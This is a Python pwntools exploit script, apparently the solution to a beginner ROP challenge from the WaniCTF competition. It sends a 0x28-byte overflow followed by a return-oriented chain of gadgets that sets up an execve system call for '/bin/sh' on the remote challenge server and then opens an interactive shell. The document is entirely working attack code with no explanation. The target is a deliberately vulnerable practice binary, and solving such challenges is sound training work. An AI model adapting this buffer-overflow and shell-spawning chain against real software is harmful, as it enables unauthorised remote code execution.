from pwn import *
import sys

elf = ELF("chall")

# io = process(elf.path)
io = remote("beginners-rop-pwn.wanictf.org", 9004)

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]

p = b"A" * 0x28
p += p64(next(elf.search(asm("pop rax; ret"), executable=True)))
p += p64(0x3B)
p += p64(next(elf.search(asm("xor rsi, rsi; ret"), executable=True)))
p += p64(next(elf.search(asm("xor rdx, rdx; ret"), executable=True)))
p += p64(next(elf.search(asm("mov rdi, rsp; add rsp, 0x8; ret"), executable=True)))
p += b"/bin/sh\x00"
p += p64(next(elf.search(asm("syscall; ret"), executable=True)))
p += b"\x00" * (96 - len(p))
io.send(p)

io.interactive()
